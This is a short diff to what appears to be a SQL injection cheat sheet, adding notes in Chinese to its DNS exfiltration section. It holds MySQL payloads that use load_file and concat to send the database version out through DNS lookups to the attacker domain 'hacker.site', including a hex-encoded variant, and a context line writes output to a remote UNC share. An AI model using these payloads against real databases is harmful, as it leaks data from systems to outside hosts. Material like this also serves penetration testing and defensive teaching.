@@ -452,7 +452,12 @@ select @@version into dumpfile '\\\\192.168.0.100\\temp\\out.txt
 ```
 
 ### DNS exfiltration
+#### 路径中必须包含具体文件，以下sql不能执行。
 
+```sql
+select load_file(concat('\\\\',version(),'.hacker.site'));
+```
+#### 可成功执行
 ```sql
 select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874))
